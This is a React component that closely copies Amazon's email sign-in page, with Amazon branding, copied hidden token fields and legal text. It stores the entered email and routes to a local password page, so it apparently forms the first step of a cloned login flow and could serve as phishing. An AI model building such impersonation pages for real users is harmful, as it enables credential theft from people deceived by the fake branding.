import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useEmail } from '../context/contextData'
// npx prettier --write .

export default function EmailPc() {
    const { email, setEmail } = useEmail()
    const [showErrorMessage, setShowErrorMessage] = useState(false)
    const navigater = useNavigate()

    const handleInputChange = (event) => {
        const { value } = event.target
        setEmail(value)
    }

    const handleContinueClick = () => {
        if (email.includes('@')) {
            setShowErrorMessage(false)

            navigater('/password')
        } else {
            setShowErrorMessage(true)
        }
    }

    return (
        <div className='a-section a-padding-medium auth-workflow'>
            <div className='a-section a-spacing-none auth-navbar'>
                <div className='a-section a-spacing-medium a-text-center'>
                    <a
                        className='a-link-nav-icon'
                        tabIndex='-1'
                        href='/ref=ap_frn_logo'
                    >
                        <i
                            className='a-icon a-icon-logo'
                            role='img'
                            aria-label='Amazon'
                        ></i>
                    </a>
                </div>
            </div>

            <div id='authportal-center-section' className='a-section'>
                <div id='authportal-main-section' className='a-section'>
                    <div
                        className='a-section a-spacing-base auth-pagelet-container'
                        id='there-was-problem'
                    >
                        <div className='a-section'>
                            {showErrorMessage && (
                                <div
                                    id='auth-error-message-box'
                                    className='a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base hidden'
                                    role='alert'
                                >
                                    <div className='a-box-inner a-alert-container'>
                                        <h4 className='a-alert-heading'>
                                            There was a problem
                                        </h4>
                                        <i className='a-icon a-icon-alert'></i>
                                        <div className='a-alert-content'>
                                            <ul className='a-unordered-list a-nostyle a-vertical a-spacing-none'>
                                                <li>
                                                    <span className='a-list-item'>
                                                        We cannot find an
                                                        account with that email
                                                        address
                                                    </span>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            )}

                            <div className='a-section auth-pagelet-container'>
                                <div
                                    id='passkey-error-alert'
                                    className='a-box a-alert a-alert-error aok-hidden'
                                    role='alert'
                                >
                                    <div className='a-box-inner a-alert-container'>
                                        <h4 className='a-alert-heading'>
                                            Passkey error
                                        </h4>
                                        <i className='a-icon a-icon-alert'></i>
                                        <div className='a-alert-content'>
                                            <p id='passkey-client-error-message'>
                                                Something went wrong, please
                                                sign-in another way or follow
                                                any instructions provided by
                                                your device.
                                            </p>
                                            <p
                                                id='passkey-generic-server-error-message'
                                                className='aok-hidden'
                                            >
                                                Sorry, your passkey isn't
                                                working. There might be a
                                                problem with the server. Sign in
                                                with your password or try your
                                                passkey again later.
                                            </p>
                                            <p
                                                id='passkey-server-error-message'
                                                className='aok-hidden'
                                            ></p>
                                        </div>
                                    </div>
                                </div>

                                <div className='a-section a-spacing-base'>
                                    <div className='a-section'>
                                        <form
                                            name='signIn'
                                            method='post'
                                            action='https://www.amazon.com/ap/signin'
                                            className='auth-validate-form auth-real-time-validation a-spacing-none'
                                            data-fwcim-id='EOxkKaky'
                                        />
                                        <input
                                            type='hidden'
                                            name='appActionToken'
                                            value='ndhV4NAeUhfQ8MW67tj2FDsL5rFpUj3D'
                                        />
                                        <input
                                            type='hidden'
                                            name='appAction'
                                            value='SIGNIN_PWD_COLLECT'
                                        />
                                        <input
                                            type='hidden'
                                            name='subPageType'
                                            value='SignInClaimCollect'
                                        />

                                        <input
                                            type='hidden'
                                            name='metadata1'
                                            value=' '
                                        />

                                        <input
                                            type='hidden'
                                            name='openid.return_to'
                                            value='ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS8/cmVmXz1uYXZfY3VzdHJlY19zaWduaW4='
                                        />

                                        <input
                                            type='hidden'
                                            name='prevRID'
                                            value='ape:R1dONkQxOTRUSDk2WDRaVzc2Vko='
                                        />

                                        <input
                                            type='hidden'
                                            name='workflowState'
                                            value=' '
                                        />
                                        <div className='a-section'>
                                            <div className='a-box'>
                                                <div className='a-box-inner a-padding-extra-large'>
                                                    <h1 className='a-spacing-small text-aline'>
                                                        Sign in
                                                    </h1>

                                                    <div className='a-row a-spacing-base text-aline'>
                                                        <label
                                                            htmlFor='ap_email'
                                                            className='a-form-label'
                                                        >
                                                            Email or mobile
                                                            phone number
                                                        </label>

                                                        <input
                                                            type='email'
                                                            maxLength='128'
                                                            id='ap_email'
                                                            name='email'
                                                            tabIndex='1'
                                                            className='a-input-text a-span12 auth-required-field'
                                                            value={email}
                                                            onChange={
                                                                handleInputChange
                                                            }
                                                        />

                                                        <div
                                                            id='auth-email-missing-alert'
                                                            className='a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini'
                                                            role='alert'
                                                        >
                                                            <div className='a-box-inner a-alert-container'>
                                                                <i className='a-icon a-icon-alert'></i>
                                                                <div className='a-alert-content'>
                                                                    Enter your
                                                                    email or
                                                                    mobile phone
                                                                    number
                                                                </div>
                                                            </div>
                                                        </div>

                                                        <input
                                                            type='hidden'
                                                            name='create'
                                                            value='0'
                                                        />

                                                        <div className='a-section'>
                                                            <span
                                                                id='continue'
                                                                className='a-button a-button-span12 a-button-primary a-spacing-top-medium'
                                                                onClick={
                                                                    handleContinueClick
                                                                }
                                                            >
                                                                <span className='a-button-inner'>
                                                                    <input
                                                                        type='submit'
                                                                        tabIndex='5'
                                                                        className='a-button-input'
                                                                        aria-labelledby='continue-announce'
                                                                    />
                                                                    <span
                                                                        id='continue-announce'
                                                                        className='a-button-text'
                                                                        aria-hidden='true'
                                                                    >
                                                                        Continue
                                                                    </span>
                                                                </span>
                                                            </span>

                                                            <div
                                                                id='legalTextRow'
                                                                className='a-row a-spacing-top-medium a-size-small'
                                                            >
                                                                By continuing,
                                                                you agree to
                                                                Amazon's
                                                                <a href='#'>
                                                                    Conditions
                                                                    of Use
                                                                </a>{' '}
                                                                and
                                                                <a href='#'>
                                                                    Privacy
                                                                    Notice
                                                                </a>
                                                                .
                                                            </div>
                                                        </div>

                                                        <div className='a-section'>
                                                            <div className='a-row a-expander-container a-expander-inline-container'>
                                                                <a
                                                                    data-csa-c-func-deps='aui-da-a-expander-toggle'
                                                                    data-csa-c-type='widget'
                                                                    data-csa-interaction-events='click'
                                                                    aria-expanded='false'
                                                                    role='button'
                                                                    href='#'
                                                                    data-action='a-expander-toggle'
                                                                    className='a-expander-header a-declarative a-expander-inline-header a-link-expander'
                                                                    data-a-expander-toggle='{"allowLinkDefault":true, "expand_prompt":"", "collapse_prompt":""}'
                                                                    data-csa-c-id='7o5xym-58oqxv-ncfef0-6g56lf'
                                                                >
                                                                    <i className='a-icon a-icon-expand'></i>
                                                                    <span className='a-expander-prompt'>
                                                                        Need
                                                                        help?
                                                                    </span>
                                                                </a>
                                                            </div>
                                                        </div>

                                                        <div
                                                            id='ab-signin-link-section'
                                                            className='a-section'
                                                        >
                                                            <hr
                                                                aria-hidden='true'
                                                                className='a-divider-normal'
                                                            />
                                                            <div className='a-section a-spacing-micro'>
                                                                <span className='a-text-bold'>
                                                                    Buying for
                                                                    work?
                                                                </span>
                                                            </div>

                                                            <a
                                                                id='ab-sign-in-ingress-link'
                                                                className='a-link-normal'
                                                                href='https://www.amazon.com/business/register/welcome?ref_=ab_reg_signin'
                                                            >
                                                                <span>
                                                                    Shop on
                                                                    Amazon
                                                                    Business
                                                                </span>
                                                            </a>
                                                        </div>
                                                    </div>

                                                    <input
                                                        type='hidden'
                                                        name='aaToken'
                                                        value='{"uniqueValidationId":"112f8b28-2321-4450-a275-eb9a873d84dc"}'
                                                    />
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div className='a-divider a-divider-break'>
                                        <h5 aria-level='5'>New to Amazon?</h5>
                                    </div>
                                    <span
                                        id='auth-create-account-link'
                                        className='a-button a-button-span12 a-button-base'
                                    >
                                        <span className='a-button-inner'>
                                            <a
                                                id='createAccountSubmit'
                                                href=''
                                                className='a-button-text'
                                            >
                                                Create your Amazon account
                                            </a>
                                        </span>
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    )
}
